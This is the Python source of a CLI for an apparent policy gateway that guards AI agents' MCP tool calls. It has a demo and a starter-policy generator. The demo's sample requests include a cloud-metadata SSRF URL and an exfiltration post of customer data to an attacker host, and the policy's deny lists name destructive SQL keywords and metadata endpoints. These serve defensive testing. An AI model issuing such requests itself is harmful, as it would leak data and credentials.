"""Agent Policy Gateway CLI — the simplest way to protect any MCP server.

Usage:
    apg proxy --target http://localhost:9000 --policy policy.json
    apg proxy --target http://localhost:9000  # uses default deny-all policy
    apg demo   # runs a built-in demo showing allow/deny

That's it. One command, your MCP server is now policy-protected.
"""

from __future__ import annotations

import argparse
import json
import os
import sys
import time
import hashlib
import re
from pathlib import Path


def main():
    parser = argparse.ArgumentParser(
        prog="apg",
        description="Zero Trust Policy Gateway for AI Agents",
    )
    subparsers = parser.add_subparsers(dest="command")

    # --- proxy command ---
    proxy_parser = subparsers.add_parser(
        "proxy",
        help="Start Agent Policy Gateway as a transparent proxy in front of any MCP server",
    )
    proxy_parser.add_argument(
        "--target",
        required=True,
        help="URL of the MCP server to protect (e.g., http://localhost:9000)",
    )
    proxy_parser.add_argument(
        "--policy",
        default="policy.json",
        help="Path to policy.json (default: ./policy.json)",
    )
    proxy_parser.add_argument(
        "--port",
        type=int,
        default=8000,
        help="Port for Agent Policy Gateway to listen on (default: 8000)",
    )
    proxy_parser.add_argument(
        "--token",
        default=None,
        help="Agent bearer token (default: from APG_AGENT_TOKEN env var)",
    )
    proxy_parser.add_argument(
        "--audit-file",
        default="apg-audit.jsonl",
        help="Audit log file path (default: apg-audit.jsonl)",
    )
    proxy_parser.add_argument(
        "--mode",
        choices=["enforce", "audit"],
        default="enforce",
        help="enforce=block denied requests, audit=log but allow all (default: enforce)",
    )

    # --- demo command ---
    subparsers.add_parser(
        "demo",
        help="Run an interactive demo showing Agent Policy Gateway enforcement",
    )

    # --- init command ---
    init_parser = subparsers.add_parser(
        "init",
        help="Generate a starter policy.json file",
    )
    init_parser.add_argument(
        "--output",
        default="policy.json",
        help="Output path (default: ./policy.json)",
    )

    args = parser.parse_args()

    if args.command == "proxy":
        _run_proxy(args)
    elif args.command == "demo":
        _run_demo()
    elif args.command == "init":
        _run_init(args)
    else:
        parser.print_help()
        sys.exit(1)


def _run_proxy(args):
    """Start the transparent MCP proxy."""
    # Set token
    if args.token:
        os.environ["APG_AGENT_TOKEN"] = args.token
    elif not os.environ.get("APG_AGENT_TOKEN"):
        # Generate a random token for easy local testing
        token = hashlib.sha256(str(time.time()).encode()).hexdigest()[:32]
        os.environ["APG_AGENT_TOKEN"] = token
        print(f"  Generated token: {token}")
        print(f"  Set APG_AGENT_TOKEN={token} in your agent's env")
        print()

    # Check policy file
    policy_path = Path(args.policy)
    if not policy_path.exists():
        print(f"  Policy file not found: {args.policy}")
        print(f"  Run 'apg init' to generate a starter policy")
        print(f"  Or Agent Policy Gateway will use default deny-all policy")
        print()

    os.environ["APG_TARGET_URL"] = args.target
    os.environ["APG_AUDIT_FILE"] = args.audit_file
    os.environ["APG_MODE"] = args.mode

    print("┌───────────────────────────────────────────────────┐")
    print("│           Agent Policy Gateway                     │")
    print("├───────────────────────────────────────────────────┤")
    print(f"│  Listening:  http://0.0.0.0:{args.port:<23}│")
    print(f"│  Target:     {args.target:<36}│")
    print(f"│  Policy:     {args.policy:<36}│")
    print(f"│  Mode:       {args.mode:<36}│")
    print(f"│  Audit log:  {args.audit_file:<36}│")
    print("├───────────────────────────────────────────────────┤")
    print("│  Point your MCP client here instead of the        │")
    print("│  target. APG will enforce policy on every          │")
    print("│  tools/call request.                               │")
    print("└───────────────────────────────────────────────────┘")
    print()

    import uvicorn
    from agent_policy_gateway.proxy_app import create_proxy_app

    app = create_proxy_app(
        target_url=args.target,
        policy_path=str(policy_path) if policy_path.exists() else None,
        audit_file=args.audit_file,
        mode=args.mode,
    )
    uvicorn.run(app, host="0.0.0.0", port=args.port, log_level="info")


def _run_demo():
    """Run an interactive demo."""
    print("┌───────────────────────────────────────────────────┐")
    print("│         Agent Policy Gateway — Live Demo           │")
    print("└───────────────────────────────────────────────────┘")
    print()
    print("This simulates an AI agent making requests through Agent Policy Gateway.")
    print()

    # Inline demo — no server needed
    from agent_policy_gateway.proxy_app import evaluate_request

    scenarios = [
        {
            "name": "Valid SELECT Query",
            "method": "db.query",
            "params": {"query": "SELECT name, email FROM customers WHERE active=1"},
        },
        {
            "name": "DELETE Attempt",
            "method": "db.query",
            "params": {"query": "DELETE FROM customers WHERE id=42"},
        },
        {
            "name": "SSRF — Cloud Metadata",
            "method": "http.get",
            "params": {"url": "http://169.254.169.254/latest/meta-data/"},
        },
        {
            "name": "Data Exfiltration",
            "method": "http.post",
            "params": {"url": "https://evil.attacker.com/steal", "body": "customer data"},
        },
    ]

    for i, s in enumerate(scenarios, 1):
        result = evaluate_request(s["method"], s["params"])
        icon = "✓" if result["allowed"] else "✗"
        color_start = "\033[92m" if result["allowed"] else "\033[91m"
        color_end = "\033[0m"
        print(f"  {i}. {s['name']}")
        print(f"     Action: {s['method']}({json.dumps(s['params'])})")
        print(f"     Result: {color_start}{icon} {result['outcome']}{color_end}")
        if result.get("reason"):
            print(f"     Reason: {result['reason']}")
        print()

    print("─────────────────────────────────────────────")
    print("Agent Policy Gateway blocked 3/4 requests. The one allowed request")
    print("would have sensitive fields (SSN, passwords) redacted")
    print("from the response before returning to the agent.")


def _run_init(args):
    """Generate a starter policy.json."""
    policy = {
        "version": 1,
        "default": "deny",
        "session_limits": {
            "max_calls_per_session": 200,
            "max_records_per_session": 5000,
        },
        "tools": {
            "db.query": {
                "allow": True,
                "operations": ["select"],
                "tables": [],
                "constraints": {"limit": {"max": 100}},
                "deny_keywords": ["DROP", "DELETE", "UPDATE", "INSERT", "ALTER", "TRUNCATE"],
                "destination_whitelist": [],
                "deny_destinations": [],
            },
            "http.get": {
                "allow": True,
                "operations": ["GET"],
                "destination_whitelist": ["https://api.yourcompany.com"],
                "deny_destinations": ["169.254.169.254", "metadata.google.internal"],
            },
        },
    }

    output_path = Path(args.output)
    output_path.write_text(json.dumps(policy, indent=2))
    print(f"Created {output_path}")
    print()
    print("Edit this file to configure which tools and operations are allowed.")
    print("Then run:")
    print(f"  apg proxy --target http://your-mcp-server:9000 --policy {output_path}")


if __name__ == "__main__":
    main()
